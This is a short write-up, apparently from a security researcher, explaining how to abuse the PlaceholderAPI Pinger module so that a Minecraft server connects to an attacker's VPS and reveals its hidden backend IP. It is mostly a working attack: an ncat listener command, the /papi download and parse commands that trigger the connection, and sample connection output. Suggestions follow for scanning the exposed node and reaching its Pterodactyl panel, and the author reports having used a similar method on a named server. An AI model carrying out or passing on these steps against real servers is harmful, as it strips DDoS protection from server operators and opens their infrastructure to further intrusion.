# PlaceholderAPI getting node IP method.

### Overview
PlaceholderAPI is a plugin made for getting variables such as a bungee's server online number.

### Analysis
We are going to focus on one module. It is called "Pinger". It is made to check if minecraft server's are online. We can use this method for example:
```
%pinger_isonline_0.0.0.0:25566%
```

I guess you already know where I am going. Minecraft uses packets for transportating data such as block placement from other players etc. What I want to go is that we can make this module check for our server using a PlaceholderAPI's command.

### Exploiting
We need a VPS server or a server that can receive connections from anywhere in the world. In this case I'm going to use a VPS.
(port) = A number from 1-65535.
(server_ip) = The vps' IP.

VPS-SIDE:
1. We need to install `ncat` on our VPS.
    * `apt-get install ncat`
2. Then we listen for connections.
    * `ncat -lnvp (port)`

ATTACK-SIDE:
1. If not already installed. We install Pinger.
    * `/papi ecloud download Pinger`
2. Easy. Run a test with the following command and then wait on our terminal.
    * `/papi parse me %pinger_isonline_(server_ip):(port)%`

We will then get an output like this:

```c
Ncat: Connection from 212.192.29.22.
Ncat: Connection from 212.192.29.22:37100.
```

### Prevention
As right know. I only would know one method and it is to block PlaceholderAPI's commands or block connections to unauthorized servers.

### What we can do with the IP?
- Scan the server in case we can get more information, such as Pterodactyl domain which we can expose whole server nodes/get the panel.
- If we are in the situation that we just get into a Build Server through a TCPShield' server. Pinger sometimes is installed for no reason so we can just send the message in chat and wait. This happened to me in Hycraft but with FastAsyncWorldEdit method.
